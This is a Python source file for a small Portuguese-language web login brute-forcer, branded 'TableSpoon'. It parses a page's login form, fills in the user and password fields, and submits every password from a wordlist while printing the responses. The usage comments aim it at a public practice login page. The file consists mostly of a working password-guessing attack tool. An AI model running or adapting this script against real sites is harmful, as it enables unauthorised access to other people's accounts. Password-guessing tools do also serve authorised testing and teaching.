import os
import argparse
import aiofiles
import asyncio
import requests
from bs4 import BeautifulSoup
from datetime import datetime as dt

def banner_small_negative_filled():
    os.system('clear')
    print(f'''
▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
█▄▄░▄▄█░▄▄▀█░▄▄▀█░██░▄▄██░▄▄▄░█▀▄▄▀█▀▄▄▀█▀▄▄▀█░▄▄▀
███░███░▀▀░█░▄▄▀█░██░▄▄██▄▄▄▀▀█░▀▀░█░██░█░██░█░██░
███░███▄██▄█▄▄▄▄█▄▄█▄▄▄██░▀▀▀░█░█████▄▄███▄▄██▄██▄
▀▀▀▀▀▀▀▀▀▀▀▀▀{time_now()} github.com/bluurw
    ''')

def time_now():
    return dt.now().strftime('%d/%m/%Y %H:%M:%S')

async def fileReader(file):
    try:
        async with aiofiles.open(f'{file}', 'r') as f:
            lines = await f.readlines()
            return True, lines
    except FileNotFoundError:
        return False, 'Arquivo nao encontrado'
    except Exception as err:
        return False, err

async def TableSpoon(url, username, password, verbose) -> str():
    try:
        response = requests.get(url, timeout=10)
        response.raise_for_status()
    except requests.exceptions.RequestException as e:
        print(f'[#][ERRO][{time_now()}] Falha ao acessar a página: {e}')
    soup = BeautifulSoup(response.text, 'html.parser')
    form = soup.find('form')
    if not form:
        print(f'[#][ERRO][{time_now()}] Nenhum campo para input.')

    action = form.get('action')
    method = form.get('method', 'get').lower()

    target_url = (
        action if action.startswith('http') 
        else requests.compat.urljoin(url, action)
    )
    inputs = form.find_all('input')
    form_data = {}

    for input_tag in inputs:
        name = input_tag.get('name')
        value = input_tag.get('value', '')
        if not name:
            continue

        lname = name.lower()
        if 'user' in lname or 'login' in lname or 'nome' in lname:
            form_data[name] = username
        elif 'pass' in lname or 'senha' in lname:
            form_data[name] = password
        else:
            form_data[name] = value  # persiste valor original

    try:
        if method == 'post':
            result = requests.post(target_url, data=form_data, timeout=10)
        else:
            result = requests.get(target_url, params=form_data, timeout=10)
        
        print(f'[$][INFO][{time_now()}] URL: {result.url} Status: {result.status_code}')
        print(f'{" "*3}[>][INFO][{time_now()}] User: {username} Password: {password}')
        if verbose:
            print(f'[$][INFO][{time_now()}] Banner:\n{result.text[:500]}')
    except requests.exceptions.RequestException as e:
        print(f'[#][ERRO][{time_now()}] Falha ao enviar formulário: {e}')


async def engine(url, user, passw=None, wordlist=None, verbose=False):
    if wordlist != None:
        if os.path.exists(wordlist):
            status, payloads = await fileReader(os.path.abspath(wordlist))
            for payload in payloads:
                await TableSpoon(url, user, payload.strip(), verbose)
        else:
            print(f'Arquivo {wordlist} nao encontrado')
    else:
        await TableSpoon(url, user, passw, verbose)


async def main():
    parser = argparse.ArgumentParser()
    banner_small_negative_filled()
    parser.add_argument('--url', type=str, required=True)
    parser.add_argument('--user', type=str)
    parser.add_argument('--passw', type=str)
    parser.add_argument('--wordlist', type=str)
    parser.add_argument('--verbose', type=str)

    args = parser.parse_args()
    await engine(args.url, args.user, args.passw, args.wordlist, args.verbose)

if __name__ == '__main__':
    asyncio.run(main())

# Exemplo de uso 

# Sem wordlist
# python main.py --url 'https://practice.expandtesting.com/login' --user 'practice' --passw 'SuperSecretPassword!'

# Com wordlist
# python main.py --url 'https://practice.expandtesting.com/login' --user 'practice' --wordlist wordlist.txt